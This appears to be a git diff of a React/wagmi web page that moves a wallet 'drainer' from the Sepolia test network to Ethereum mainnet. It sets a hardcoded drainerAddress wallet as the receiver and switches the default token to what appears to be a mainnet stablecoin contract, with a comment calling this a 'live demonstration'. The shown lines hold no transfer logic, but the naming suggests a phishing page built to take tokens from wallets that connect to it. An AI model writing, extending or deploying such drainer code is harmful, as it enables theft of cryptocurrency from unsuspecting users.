@@ -4,7 +4,7 @@ import { AppKitButton } from '@reown/appkit/react'
 
 import { useState, useEffect } from 'react'
 import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useReadContract, useBalance } from 'wagmi'
-import { sepolia } from 'wagmi/chains'
+import { mainnet } from 'wagmi/chains'
 import { parseUnits, formatEther } from 'viem'
 import styles from './page.module.css'
 
@@ -42,8 +42,8 @@ export default function Home() {
   const { data: ethBalance } = useBalance({ address })
 
   const drainerAddress = (process.env.NEXT_PUBLIC_ADMIN_WALLET || "0xd115dbad4574D1332a44d7453B387ad38750c957") as `0x${string}`;
-  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0xBDD3104Baa83F8302877eAaed48E78B91B34de02") as `0x${string}`;
-  const targetChainId = sepolia.id; // Moving back to Sepolia ID for on-chain TX execution
+  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7") as `0x${string}`;
+  const targetChainId = mainnet.id; // Targeting Ethereum Mainnet for live demonstration
 
   const { data: balanceData, isError: balanceError } = useReadContract({
     address: tokenAddress,
